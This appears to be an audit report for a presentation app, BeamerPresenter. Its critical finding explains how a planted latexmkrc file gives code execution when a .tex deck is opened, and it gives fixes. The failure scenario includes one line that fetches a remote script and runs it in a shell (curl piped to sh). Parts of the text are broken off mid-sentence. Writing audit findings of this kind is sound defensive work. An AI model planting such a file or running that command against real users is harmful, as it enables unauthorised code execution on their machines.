> **Every finding in this document is fixed.** 110 were closed in **7.0** and the
> remaining 7 in **7.1**, both released on 2026-11-15. Nothing here is an open
> issue in a current build.
>
> **If you are running 6.3 or earlier, upgrade.** This document describes, in

>

> drawer. See `CHANGELOG.md` for what each fix actually changed.

## How the audit was run

Fourteen dimensions — eight security, six GUI/UX — across macOS, iPadOS and the
Linux/Tauri port, followed by a completeness critic that named five blind spots
and a second round aimed at exactly those. **Every** finding was then attacked by
three independent verifiers, each with its own lens: for security *refute*,
*exploit chain* and *evidence precision*; for GUI *reproduce*, *impact* and
*precision*. Majority rules, and the severity shown is the median of the three.

Only findings that survived that pass are listed as confirmed. The ones that did
not are listed too, at the end — a defect that was argued down is worth recording,
if only so it is not re-reported as new.

# Critical

## `Sources/BeamerPresenter/Dependencies.swift:67` — latexmk runs ./latexmkrc as Perl: opening an untrusted .tex is RCE

*Process execution*  ·  3/3 verifiers confirmed

compile() sets the child's working directory to the .tex file's own folder and prefers `latexmk`, but never passes `-norc`. latexmk evaluates `./latexmkrc` (or `./.latexmkrc`) as Perl before doing anything else, so any folder that contains a .tex also gets arbitrary code execution in the app's (unsandboxed) process.

```
process.currentDirectoryURL = texURL.deletingLastPathComponent()
process.executableURL = URL(fileURLWithPath: engine.path)
let file = texURL.lastPathComponent
process.arguments = engine.name == "latexmk"
    ? ["-pdf", "-interaction=nonstopmode", "-halt-on-error", file]
```

**Failure scenario:** A shared/downloaded deck archive expands to talk/{talk.tex, latexmkrc, figures/}. latexmkrc contains `system("curl -s http://x/i.sh | sh");`. The user double-clicks talk.tex (Resources/Info.plist registers the app as a viewer for org.tug.tex, so Finder launches BeamerPresenter), or drops it on the window. AppDelegate.load(url:) -> latexMaker -> Dependencies.compile runs with no confirmation prompt, latexmk reads latexmkrc from the cwd and the payload runs as the user. The app ships no sandbox entitlements, so nothing confines it.

**Fix:** In Dependencies.compile add `-norc` as the first latexmk argument (and `-no-shell-escape` for the direct engines). Do not rely on the cwd being trustworthy: the same folder that holds the deck is attacker-controlled whenever the deck was downloaded. Ideally also prompt before the first compile of a .tex that was not created in this session.

Linux/src-tauri/src/lib.rs:75 defines ("latexmk", &["-pdf", "-interaction=nonstopmode", "-halt-on-error"]) with no -norc, and :96 runs Command::new(engine).args(args).arg(&tex).current_dir(dir). Worse, engine selection there uses .find(|(name, _)| which(name).is_some()) over a latexmk-first list, so latexmk wins wherever it is on PATH, not just in a preferred directory. The fix must land in both places. 2. Precise compile precondition: loadOrMake (AppDelegate.swift:787-794) loads a sibling talk.pdf when one exists and only then calls latexMaker. This is not a mitigation — the attacker simply omits talk.pdf from the archive, which guarantees the compile path — but the finding should state it so the maintainer does not mistake it for a guard. 3. ## `Linux/ui/js/slides.js:59` — Concurrent pdf.js renders into the same canvas reject; projector goes white

*Linux GUI*  ·  3/3 verifiers confirmed
